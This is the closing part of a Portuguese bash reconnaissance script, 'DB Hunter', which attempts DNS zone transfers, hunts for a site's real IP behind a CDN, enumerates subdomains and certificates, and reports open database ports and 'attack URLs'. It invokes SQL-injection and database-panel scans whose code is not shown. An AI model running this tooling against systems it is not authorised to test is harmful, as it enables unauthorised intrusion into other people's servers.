  # Zone Transfer
  info "Tentando AXFR..."
  dig +short "$DOMAIN" NS 2>/dev/null | while read ns; do
    AXFR=$(dig axfr "$DOMAIN" @"$ns" 2>/dev/null)
    echo "$AXFR" | grep -q "Transfer" && critical "ZONE TRANSFER via $ns!" && echo "$AXFR" | head -20
  done
}

find_real_ip() {
  section "🕵  IP REAL / BYPASS CDN"

  info "Verificando subdomínios não protegidos..."
  for sub in mail ftp cpanel whm direct smtp pop imap ns1 ns2 vpn dev stage api admin; do
    IP_SUB=$(dig +short "$sub.$DOMAIN" A 2>/dev/null | head -1)
    if [ -n "$IP_SUB" ] && [ "$IP_SUB" != "$MAIN_IP" ]; then
      found "IP diferente: $sub.$DOMAIN → $IP_SUB"
    fi
  done

  info "SPF/TXT (pode vazar IP real)..."
  dig +short "$DOMAIN" TXT 2>/dev/null | grep -i "ip4\|ip6" | while read t; do found "SPF: $t"; done

  info "Certificados SSL históricos (crt.sh)..."
  curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
    python3 -c "
import sys,json
try:
  d=json.load(sys.stdin)
  [print(e.get('name_value','')) for e in d]
except:pass
" 2>/dev/null | sort -u | sed 's/\*\.//' | while read s; do
    IP_S=$(dig +short "$s" A 2>/dev/null | head -1)
    [ -n "$IP_S" ] && subinfo "$s → $IP_S"
  done
}

geoip_info() {
  section "🗺  GEOLOCALIZAÇÃO"
  for ip in $(echo "$IPV4" | head -3); do
    GEO=$(curl -s --max-time 5 "http://ip-api.com/json/$ip?fields=country,regionName,city,zip,lat,lon,isp,org,as,proxy,hosting" 2>/dev/null)
    info "GEO $ip:"
    subinfo "País:    $(echo $GEO | grep -o '"country":"[^"]*"' | cut -d'"' -f4)"
    subinfo "Cidade:  $(echo $GEO | grep -o '"city":"[^"]*"' | cut -d'"' -f4)"
    subinfo "ISP:     $(echo $GEO | grep -o '"isp":"[^"]*"' | cut -d'"' -f4)"
    subinfo "AS:      $(echo $GEO | grep -o '"as":"[^"]*"' | cut -d'"' -f4)"
    LAT=$(echo $GEO | grep -o '"lat":[^,}]*' | cut -d: -f2)
    LON=$(echo $GEO | grep -o '"lon":[^,}]*' | cut -d: -f2)
    [ -n "$LAT" ] && info "Maps: ${CYAN}https://maps.google.com/?q=$LAT,$LON${NC}"
    echo "$GEO" | grep -o '"proxy":true' && found "PROXY/VPN detectado!"
    echo "$GEO" | grep -o '"hosting":true' && found "Datacenter/Hosting!"
  done
}

ssl_cert() {
  section "🔒 SSL/TLS + SANs"
  CERT=$(echo | timeout 8 openssl s_client -connect "$DOMAIN:443" -servername "$DOMAIN" 2>/dev/null | openssl x509 -noout -text 2>/dev/null)
  if [ -n "$CERT" ]; then
    echo "$CERT" | grep -E "Subject:|Issuer:|Not Before|Not After" | while read l; do subinfo "$l"; done
    SANS=$(echo "$CERT" | grep -A2 "Subject Alternative Name" | grep -oE "DNS:[^,]*|IP Address:[^,]*")
    if [ -n "$SANS" ]; then
      found "SANs (domínios/IPs no certificado):"
      echo "$SANS" | while read s; do subinfo "$s"; done
    fi
  fi
}

reverse_ip() {
  section "🔄 REVERSE IP"
  if [ -n "$MAIN_IP" ]; then
    REVERSE=$(curl -s --max-time 10 "https://api.hackertarget.com/reverseiplookup/?q=$MAIN_IP" 2>/dev/null)
    echo "$REVERSE" | grep -v "error\|limit" | head -20 | while read d; do subinfo "$d"; done
    host "$MAIN_IP" 2>/dev/null | while read l; do subinfo "$l"; done
  fi
}

subdomains() {
  section "🌿 SUBDOMÍNIOS"
  for sub in www mail ftp smtp pop imap webmail cpanel api dev stage test beta admin portal vpn cdn static img media ns1 ns2 shop blog help support docs status m wap app; do
    IP_S=$(dig +short "$sub.$DOMAIN" A 2>/dev/null | head -1)
    [ -n "$IP_S" ] && info "$sub.$DOMAIN → $IP_S"
  done
  curl -s "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" 2>/dev/null | grep -v "error\|limit" | head -20 | while read l; do subinfo "$l"; done
}

# ================================================================
#  RELATÓRIO FINAL
# ================================================================

final_report() {
  section "📊 RELATÓRIO FINAL - DB HUNTER"

  echo -e "\n${WHITE}╔══════════════════════════════════════════════════════════╗${NC}"
  echo -e "${WHITE}║${NC} ${RED}${BOLD}          ⚠  VULNERABILIDADES ENCONTRADAS ⚠${NC}           ${WHITE}║${NC}"
  echo -e "${WHITE}╠══════════════════════════════════════════════════════════╣${NC}"
  echo -e "${WHITE}║${NC} ${CYAN}Alvo:${NC}         $DOMAIN"
  echo -e "${WHITE}║${NC} ${CYAN}IP Principal:${NC} $MAIN_IP"
  echo -e "${WHITE}║${NC} ${CYAN}IPs IPv4:${NC}     $(echo $IPV4 | tr '\n' ' ')"
  echo -e "${WHITE}╠══════════════════════════════════════════════════════════╣${NC}"

  if [ ${#OPEN_PORTS[@]} -gt 0 ]; then
    echo -e "${WHITE}║${NC} ${RED}Portas DB Abertas:${NC} ${OPEN_PORTS[*]}"
  fi

  echo -e "${WHITE}║${NC} ${CYAN}Log salvo em:${NC} $LOG_FILE"
  echo -e "${WHITE}╠══════════════════════════════════════════════════════════╣${NC}"

  # URLs vulneráveis do log
  if grep -q "🔗 URL" "$LOG_FILE" 2>/dev/null; then
    echo -e "${WHITE}║${NC} ${PURPLE}URLs de Ataque/Teste:${NC}"
    grep "🔗 URL" "$LOG_FILE" | sed 's/\[🔗 URL\] //' | head -20 | while read url; do
      echo -e "${WHITE}║${NC}   ${CYAN}→ $url${NC}"
    done
  fi

  echo -e "${WHITE}╠══════════════════════════════════════════════════════════╣${NC}"

  VULN_COUNT=$(grep -c "★ VULN\|CRÍTICO" "$LOG_FILE" 2>/dev/null || echo "0")
  if [ "$VULN_COUNT" -gt 0 ]; then
    echo -e "${WHITE}║${NC} ${BG_RED}${WHITE} TOTAL DE VULNERABILIDADES: $VULN_COUNT ${NC}"
  else
    echo -e "${WHITE}║${NC} ${BG_GREEN}${WHITE} Nenhuma vulnerabilidade crítica encontrada ${NC}"
  fi

  echo -e "${WHITE}║${NC} ${YELLOW}Data:${NC} $(date '+%d/%m/%Y %H:%M:%S')"
  echo -e "${WHITE}╚══════════════════════════════════════════════════════════╝${NC}"

  echo -e "\n${GREEN}[✓] Log completo: ${CYAN}$LOG_FILE${NC}"
}

# ================================================================
#  MAIN
# ================================================================
banner

if [ -z "$1" ]; then
  echo -e "${YELLOW}Uso: bash dbhunter.sh <site>${NC}"
  echo -e "Ex:  ${GREEN}bash dbhunter.sh google.com${NC}\n"
  read -p "$(echo -e ${CYAN}Digite o alvo: ${NC})" INPUT
  TARGET="$INPUT"
else
  TARGET="$1"
fi

[ -z "$TARGET" ] && echo -e "${RED}[!] Nenhum alvo.${NC}" && exit 1

check_deps
resolve_target "$TARGET"
init_log
full_dns
find_real_ip
geoip_info
ssl_cert
subdomains
reverse_ip
db_port_scanner
web_db_panels
sqli_scan
final_report
